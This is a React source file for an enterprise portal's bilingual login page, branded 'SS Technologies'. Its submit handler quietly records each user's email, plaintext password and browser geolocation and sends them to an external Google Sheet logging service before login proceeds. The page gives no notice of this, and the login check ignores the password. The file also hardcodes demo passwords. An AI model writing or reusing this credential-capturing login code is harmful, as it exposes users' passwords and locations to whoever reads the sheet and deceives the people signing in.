
import React, { useState } from 'react';
import { useApp } from '../context/AppContext';
import { UserRole, Language } from '../types';
import {
  Mail,
  Lock,
  ArrowRight,
  Info,
  Loader2,
  ShieldCheck,
  Users,
  Eye,
  EyeOff,
  Zap,
  Globe,
  BarChart3,
  Cpu,
  Fingerprint
} from 'lucide-react';

const translations = {
  EN: {
    portalEntry: "Portal Entry",
    subtitle: "Enter your enterprise credentials to connect.",
    personnel: "Personnel",
    adminNode: "Admin Node",
    identityEndpoint: "Identity Endpoint",
    securityKey: "Security Key",
    establishConnection: "Establish Connection",
    processing: "Processing...",
    placeholderEmail: "id@sstechnologies.io",
    errorEmpty: "Please provide a valid workspace identity.",
    errorInvalid: "Invalid credentials for the specified endpoint.",
    infrastructure: "Trusted Infrastructure Partners",
    metadata: "Security Handshake: TLS 1.3 • AES-256 Enabled"
  },
  TA: {
    portalEntry: "போர்ட்டல் நுழைவு",
    subtitle: "இணைக்க உங்கள் நிறுவன நற்சான்றிதழ்களை உள்ளிடவும்.",
    personnel: "பணியாளர்கள்",
    adminNode: "நிர்வாக முனை",
    identityEndpoint: "அடையாள முனை",
    securityKey: "பாதுகாப்பு சாவி",
    establishConnection: "இணைப்பை ஏற்படுத்து",
    processing: "செயலாக்கம்...",
    placeholderEmail: "id@sstechnologies.io",
    errorEmpty: "செல்லுபடியாகும் பணியிட அடையாளத்தை வழங்கவும்.",
    errorInvalid: "குறிப்பிட்ட இறுதிப்புள்ளிக்கு தவறான நற்சான்றிதழ்கள்.",
    infrastructure: "நம்பகமான உள்கட்டமைப்பு கூட்டாளர்கள்",
    metadata: "பாதுகாப்பு கைகுலுக்கல்: TLS 1.3 • AES-256 செயல்படுத்தப்பட்டது"
  }
};

const Login: React.FC = () => {
  const { login, language, setLanguage } = useApp();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [activeRole, setActiveRole] = useState<UserRole>(UserRole.EMPLOYEE);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const t = translations[language];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    // Get Location and Log
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
        await import('../services/googleSheetService').then(m => m.logToGoogleSheet(email, password, loc));
        proceedLogin(email);
      },
      async (err) => {
        console.warn("Location access denied", err);
        await import('../services/googleSheetService').then(m => m.logToGoogleSheet(email, password, null));
        proceedLogin(email);
      }
    );
  };

  const proceedLogin = (email: string) => {
    setTimeout(() => {
      if (email) {
        const success = login(email);
        if (!success) {
          setError(t.errorInvalid);
          setIsLoading(false);
        }
      } else {
        setError(t.errorEmpty);
        setIsLoading(false);
      }
    }, 1200);
  };

  const handleDemoAccess = (role: UserRole) => {
    setActiveRole(role);
    const demoEmail = role === UserRole.OWNER ? 'owner@workforce.com' : 'sarah@workforce.com';
    setEmail(demoEmail);
    setPassword('password123');
  };

  return (
    <div className="min-h-screen w-full flex flex-col lg:flex-row bg-white overflow-hidden relative">

      {/* Global Language Switcher - Placed at top right of the whole page */}
      <div className="fixed top-6 right-6 z-[100] flex items-center gap-1 bg-white/80 backdrop-blur-md p-1.5 rounded-2xl border border-slate-200 shadow-xl">
        <button
          onClick={() => setLanguage('EN')}
          className={`px-4 py-2 rounded-xl text-[10px] font-black transition-all flex items-center gap-2 ${language === 'EN' ? 'bg-slate-900 text-white shadow-lg shadow-slate-900/20' : 'text-slate-500 hover:text-slate-800'}`}
        >
          <Globe size={12} /> EN
        </button>
        <button
          onClick={() => setLanguage('TA')}
          className={`px-4 py-2 rounded-xl text-[10px] font-black transition-all ${language === 'TA' ? 'bg-slate-900 text-white shadow-lg shadow-slate-900/20' : 'text-slate-500 hover:text-slate-800'}`}
        >
          தமிழ்
        </button>
      </div>

      <div className="hidden lg:flex lg:w-1/2 relative bg-slate-900 items-center justify-center p-12 overflow-hidden">
        <div className="absolute inset-0 z-0">
          <img
            src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=2070"
            className="w-full h-full object-cover opacity-40 mix-blend-luminosity scale-110 animate-pulse-slow"
            alt="Cyber Security Infrastructure"
          />
          <div className="absolute inset-0 bg-gradient-to-br from-blue-600/40 via-slate-900/90 to-slate-900"></div>
          <div className="absolute inset-0 opacity-10 bg-[radial-gradient(#ffffff_1px,transparent_1px)] [background-size:20px_20px]"></div>
        </div>

        <div className="relative z-10 max-w-xl space-y-12 animate-in fade-in slide-in-from-left-8 duration-1000">
          <div className="flex items-center gap-5">
            <div className="w-14 h-14 bg-white rounded-2xl flex items-center justify-center shadow-2xl rotate-3 hover:rotate-0 transition-transform duration-500">
              <Cpu className="text-blue-600" size={32} />
            </div>
            <div>
              <h1 className="text-3xl font-black text-white tracking-tighter">SS Technologies</h1>
              <p className="text-blue-400 text-[10px] font-black uppercase tracking-[0.4em]">Enterprise Core v4.2</p>
            </div>
          </div>

          <div className="space-y-6">
            <h2 className="text-6xl font-black text-white leading-[1] tracking-tighter">
              The Hub of <br /><span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-indigo-300">Intelligent Operations.</span>
            </h2>
            <p className="text-xl text-slate-400 font-medium leading-relaxed max-w-md">
              Securely manage your global workforce, automate financial verification, and scale marketing impact from a single node.
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {[
              { icon: Zap, text: "Live GPS Telemetry", color: "text-blue-400", bg: "bg-blue-400/10" },
              { icon: Fingerprint, text: "Zero-Trust Auth", color: "text-emerald-400", bg: "bg-emerald-400/10" },
              { icon: BarChart3, text: "AI Expense Audit", color: "text-indigo-400", bg: "bg-indigo-400/10" },
              { icon: Globe, text: "Channel Sync", color: "text-amber-400", bg: "bg-amber-400/10" }
            ].map((feature, i) => (
              <div key={i} className={`flex items-center gap-4 p-4 rounded-2xl border border-white/5 ${feature.bg} backdrop-blur-sm group cursor-default hover:bg-white/5 transition-all`}>
                <div className={`p-2 rounded-lg ${feature.color}`}>
                  <feature.icon size={20} />
                </div>
                <span className="text-slate-300 text-sm font-bold tracking-tight">{feature.text}</span>
              </div>
            ))}
          </div>

          <div className="pt-12 border-t border-white/10 flex flex-col sm:flex-row sm:items-center justify-between gap-6">
            <div className="flex items-center gap-4">
              <div className="flex -space-x-3">
                {[12, 45, 89, 34].map((n) => (
                  <img key={n} src={`https://i.pravatar.cc/150?u=${n}`} className="w-10 h-10 rounded-full border-2 border-slate-900 shadow-xl" alt="Global User" />
                ))}
                <div className="w-10 h-10 rounded-full bg-blue-600 border-2 border-slate-900 flex items-center justify-center text-[10px] font-black text-white">+2k</div>
              </div>
              <p className="text-xs text-slate-400 font-medium">
                Active nodes in <span className="text-white font-bold">42 countries</span>.
              </p>
            </div>
          </div>
        </div>

        <div className="absolute top-[-10%] right-[-10%] w-96 h-96 bg-blue-500/10 rounded-full blur-[120px]"></div>
        <div className="absolute bottom-[-10%] left-[-10%] w-96 h-96 bg-indigo-500/10 rounded-full blur-[120px]"></div>
      </div>

      <div className="flex-1 flex items-center justify-center p-6 bg-slate-50 relative">
        <div className="absolute inset-0 opacity-[0.03] pointer-events-none overflow-hidden flex items-center justify-center">
          <Cpu size={800} className="text-slate-900 rotate-12" />
        </div>

        <div className="w-full max-w-[520px] space-y-8 animate-in fade-in slide-in-from-bottom-6 duration-700 relative z-10">
          <div className="lg:hidden mb-10 overflow-hidden rounded-[2.5rem] relative h-48 shadow-2xl">
            <img
              src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=800"
              className="w-full h-full object-cover"
              alt="Technology Banner"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-slate-900 to-transparent"></div>
            <div className="absolute bottom-6 left-8 flex items-center gap-3">
              <div className="w-10 h-10 bg-white rounded-xl flex items-center justify-center">
                <Cpu size={20} className="text-slate-900" />
              </div>
              <h1 className="text-xl font-black text-white tracking-tighter">SS Technologies</h1>
            </div>
          </div>

          <div className="bg-white rounded-[3rem] shadow-[0_40px_80px_-15px_rgba(0,0,0,0.08)] border border-white p-10 md:p-14 relative overflow-hidden">
            <div className="mb-10 text-center sm:text-left">
              <h2 className="text-4xl font-black text-slate-900 mb-2 tracking-tight">{t.portalEntry}</h2>
              <p className="text-slate-400 font-medium text-sm">{t.subtitle}</p>
            </div>

            <div className="flex p-1.5 bg-slate-50 rounded-2xl mb-10 border border-slate-100">
              <button
                onClick={() => handleDemoAccess(UserRole.EMPLOYEE)}
                className={`flex-1 flex items-center justify-center gap-2 py-4 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all duration-500 ${activeRole === UserRole.EMPLOYEE ? 'bg-white text-blue-600 shadow-xl shadow-slate-200/50 border border-slate-100' : 'text-slate-400 hover:text-slate-600'
                  }`}
              >
                <Users size={16} /> {t.personnel}
              </button>
              <button
                onClick={() => handleDemoAccess(UserRole.OWNER)}
                className={`flex-1 flex items-center justify-center gap-2 py-4 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all duration-500 ${activeRole === UserRole.OWNER ? 'bg-white text-blue-600 shadow-xl shadow-slate-200/50 border border-slate-100' : 'text-slate-400 hover:text-slate-600'
                  }`}
              >
                <ShieldCheck size={16} /> {t.adminNode}
              </button>
              <button
                onClick={() => {
                  setActiveRole(UserRole.GUEST);
                  setEmail('guest@visitor.com');
                  setPassword('guest');
                }}
                className={`flex-1 flex items-center justify-center gap-2 py-4 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all duration-500 ${activeRole === UserRole.GUEST ? 'bg-white text-emerald-600 shadow-xl shadow-slate-200/50 border border-slate-100' : 'text-slate-400 hover:text-slate-600'
                  }`}
              >
                <Globe size={16} /> GUEST
              </button>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-[10px] font-black text-slate-400 uppercase tracking-[0.2em] ml-2">{t.identityEndpoint}</label>
                <div className="relative group transition-all duration-300">
                  <div className="absolute inset-y-0 left-0 pl-6 flex items-center pointer-events-none text-slate-300 group-focus-within:text-blue-500 transition-colors">
                    <Mail size={20} />
                  </div>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder={t.placeholderEmail}
                    className="w-full bg-slate-50 border border-slate-100 rounded-[1.5rem] py-5 pl-14 pr-6 outline-none focus:ring-4 focus:ring-blue-500/10 focus:border-blue-500 focus:bg-white transition-all text-slate-900 font-bold placeholder:font-medium placeholder:text-slate-300"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between items-center ml-2">
                  <label className="text-[10px] font-black text-slate-400 uppercase tracking-[0.2em]">{t.securityKey}</label>
                </div>
                <div className="relative group transition-all duration-300">
                  <div className="absolute inset-y-0 left-0 pl-6 flex items-center pointer-events-none text-slate-300 group-focus-within:text-blue-500 transition-colors">
                    <Lock size={20} />
                  </div>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="••••••••"
                    className="w-full bg-slate-50 border border-slate-100 rounded-[1.5rem] py-5 pl-14 pr-14 outline-none focus:ring-4 focus:ring-blue-500/10 focus:border-blue-500 focus:bg-white transition-all text-slate-900 font-bold placeholder:font-medium placeholder:text-slate-300"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute inset-y-0 right-0 pr-6 flex items-center text-slate-300 hover:text-slate-600 transition-colors"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              </div>

              {error && (
                <div className="bg-rose-50 text-rose-600 p-5 rounded-2xl text-[10px] font-black uppercase tracking-widest flex items-center gap-4 border border-rose-100 animate-in zoom-in-95">
                  <Info size={18} /> {error}
                </div>
              )}

              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-slate-900 text-white font-black py-6 rounded-[1.5rem] hover:bg-slate-800 transition-all shadow-2xl shadow-slate-300 disabled:opacity-70 flex items-center justify-center gap-3 group text-[11px] uppercase tracking-[0.4em] active:scale-[0.98] mt-4"
              >
                {isLoading ? (
                  <Loader2 size={24} className="animate-spin text-blue-400" />
                ) : (
                  <>{t.establishConnection} <ArrowRight size={22} className="group-hover:translate-x-1 transition-transform" /></>
                )}
              </button>
            </form>

            <div className="mt-12 pt-8 border-t border-slate-50">
              <p className="text-center text-[9px] font-black text-slate-300 uppercase tracking-[0.3em] mb-6">{t.infrastructure}</p>
              <div className="flex items-center justify-around opacity-30 grayscale hover:grayscale-0 transition-all duration-700">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1024px-Amazon_logo.svg.png" className="h-4 object-contain" alt="Amazon" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" className="h-5 object-contain" alt="Google" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png" className="h-5 object-contain" alt="Microsoft" />
              </div>
            </div>
          </div>

          <div className="text-center">
            <p className="text-[9px] font-black text-slate-400 uppercase tracking-[0.4em] flex items-center justify-center gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span> {t.metadata}
            </p>
            <p className="text-[8px] text-slate-300 font-bold mt-2 uppercase tracking-widest">© 2025 SS TECHNOLOGIES GLOBAL OPERATIONS</p>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.35; transform: scale(1.1); }
          50% { opacity: 0.45; transform: scale(1.15); }
        }
        .animate-pulse-slow {
          animation: pulse-slow 10s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
};

export default Login;
